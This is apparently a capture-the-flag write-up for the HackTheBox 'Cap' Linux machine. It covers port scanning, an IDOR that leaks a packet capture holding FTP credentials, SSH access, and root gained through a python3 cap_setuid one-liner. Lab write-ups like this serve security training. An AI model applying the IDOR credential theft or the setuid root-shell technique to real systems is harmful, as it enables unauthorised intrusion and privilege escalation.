---
title: "HackTheBox — Cap"
date: 2024-10-02
tags: ["HackTheBox", "CTF", "HTB Easy", "HTB Linux"]
categories: ["writeups", "hackthebox"]
description: >
  Cap features an IDOR vulnerability in a Flask-based packet capture app,
  leaking FTP/SSH credentials via a PCAP file. Privilege escalation abuses
  cap_setuid on Python3 to gain a root shell.
---

## Box Info

| Field      | Details                                                       |
|------------|---------------------------------------------------------------|
| Name       | [Cap](https://www.hackthebox.com/machines/cap)                |
| OS         | `Linux`                                                       |
| Difficulty | `Easy`                                                        |
| IP         | `10.10.10.245`                                                |
| Points     | `20`                                                          |
| Creator    | [InfoSecJack](https://app.hackthebox.com/users/52045)         |

---

## Introduction

Cap is an easy Linux box running a `flask` web app that lets users download
network packet captures. An **IDOR** on the capture endpoint exposes an earlier
`.pcap` containing plaintext `FTP` credentials for user `nathan`. The same
credentials are valid over `SSH`. Privilege escalation abuses the `cap_setuid`
Linux capability on the `python3` binary to set `UID=0` and spawn a root shell.

---

## Reconnaissance

### Masscan

> `sudo masscan 10.10.10.245 -p1-65535,U:1-65535 --rate=500 -e tun0`

```bash
Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2021-06-19 14:47:10 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 21/tcp on 10.10.10.245
Discovered open port 80/tcp on 10.10.10.245
Discovered open port 22/tcp on 10.10.10.245
```

Three open ports — `21`, `22`, `80`.

---

### Nmap

> `sudo nmap -sC -sV -oN cap.nmap 10.10.10.245 -p 21,22,80`

```bash
# Nmap 7.80 scan initiated Sat Jun 19 14:46:38 2021
Nmap scan report for 10.10.10.245
Host is up (0.20s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    gunicorn

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

# Nmap done at Sat Jun 19 14:49:15 2021 — 1 IP address (1 host up) scanned in 156.80 seconds
```

- Port `21` — `FTP` running `vsftpd 3.0.3`
- Port `22` — `SSH` running `OpenSSH 8.2p1` on Ubuntu
- Port `80` — `gunicorn` HTTP server → likely `flask` or `django`

---

## Foothold

### Anonymous FTP

First attempt — anonymous login. No luck.

```
username : anonymous
password : anonymous
```

---

### Web Application Enumeration

Navigating to `http://10.10.10.245/` presents a security monitoring dashboard
for user **Nathan**. The app exposes four routes:

```
/           →  Security Events overview (last 24h)
/capture    →  Triggers a live packet capture, redirects to /data/<id>
/data/<id>  →  Downloads the corresponding <id>.pcap file
/ip         →  Returns ifconfig output
/netstat    →  Returns netstat output
```

---

### IDOR — `/data/0`

The `/capture` endpoint redirects to `/data/<id>` using an auto-incrementing
integer with **no access control** on the ID parameter.

Navigating directly to:

```
http://10.10.10.245/data/0
```

downloads `0.pcap` — the very first capture recorded on the box, before our
session began. Classic **Insecure Direct Object Reference (IDOR)**.

---

### Credential Extraction via Wireshark

Opening `0.pcap` in Wireshark[^1] and filtering for `ftp` traffic reveals a
successful FTP login in **plaintext**:

```
220 (vsFTPd 3.0.3)
USER nathan
331 Please specify the password.
PASS Buck******0RM3!
230 Login successful.
```

> Filter: `ftp` → Right-click on a packet → **Follow → TCP Stream**

✅ `nathan` : `Buck******0RM3!`

---

### SSH Access

The FTP credentials are also valid over SSH:

> `ssh nathan@10.10.10.245`

```bash
nathan@cap:~$ cat user.txt
********************************
```

---

## Privilege Escalation

### Enumeration

`sudo -l` returns nothing. Upload and run `LinEnum.sh`:

```bash
# on attacker
scp LinEnum.sh nathan@10.10.10.245:/tmp/

# on target
chmod +x /tmp/LinEnum.sh
/tmp/LinEnum.sh
```

LinEnum surfaces an interesting **Linux capability** set on the Python binary:

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

---

### Abusing `cap_setuid`

Key points:

- `cap_setuid` permits a process to make **arbitrary changes to its UID**[^2]
- The `python3.8` binary carries this capability
- Setting `UID=0` grants an effective **root** context[^3]
- `python3` is already present on the box — the Flask app on port `80` confirms it

One-liner to exploit:

> `python3 -c "import os; os.setuid(0); os.system('/bin/bash')"`

```bash
root@cap:~# id
uid=0(root) gid=1000(nathan) groups=1000(nathan)

root@cap:~# cat /root/root.txt
********************************
```

We are **`root`**.

---

## Attack Chain

```
Masscan / Nmap
      ↓
Flask web app → IDOR on /data/0
      ↓
0.pcap → Wireshark → FTP credentials (plaintext)
      ↓
SSH as nathan → user.txt
      ↓
LinEnum → cap_setuid on python3.8
      ↓
os.setuid(0) → /bin/bash → root.txt
```

---

## Summary

| Phase                | Technique                                       |
|----------------------|-------------------------------------------------|
| Recon                | Masscan + Nmap                                  |
| Vulnerability        | IDOR on `/data/<id>` (no access control)        |
| Credential Leak      | Wireshark analysis of `0.pcap` (FTP plaintext)  |
| Initial Access       | SSH with leaked credentials                     |
| Privilege Escalation | `cap_setuid` on `/usr/bin/python3.8`            |

---

[^1]: https://www.wireshark.org/
[^2]: https://man7.org/linux/man-pages/man7/capabilities.7.html
[^3]: https://superuser.com/a/626845